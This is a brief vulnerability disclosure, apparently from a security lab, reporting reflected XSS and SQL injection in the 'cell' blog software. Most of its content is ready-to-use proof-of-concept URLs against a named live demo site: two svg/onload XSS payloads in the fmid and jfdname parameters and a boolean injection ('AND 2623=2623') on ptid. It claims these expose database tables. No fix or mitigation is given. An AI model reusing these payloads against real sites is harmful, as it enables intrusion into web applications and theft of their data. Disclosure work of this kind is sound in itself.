### cell  SQLi/XSS[2]

#### ADLab of Venustech

Well, when I pentest the official demo site of cell blog, I found some vulnerabilities here.

#### XSS:

There're some reflect-xss in this system, for example:


##### XSS1

```
http://www.cells.tw/pub_readpost.php?dirpages=1&bgid=1&fmid=2%27%22%3E%3Csvg/onload=alert(/xss/)%3E%3C%27%22&ptid=23
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/cell/xss1.png)

##### XSS2

```
http://www.cells.tw/fotos/?act=showpic&jfdname=..%2Fdata%2Fjpg%2Ftest%22%3E%3Csvg/onload=alert(/xss2/)%3E%3C%27%22&rjfdname=..%2Fdata%2Fjpg%2Ftest%27
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/cell/xss2.png)



#### SQLi:


```
http://www.cells.tw/pub_readpost.php?dirpages=1&bgid=1&fmid=2&ptid=23
```

Weak get key para "ptid":

```
dirpages=1&bgid=1&fmid=2&ptid=23 AND 2623=2623
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/ready-made-job-site-script/sqli.png)


You can see,  we can obtain the current database tables or more sensitive data now!




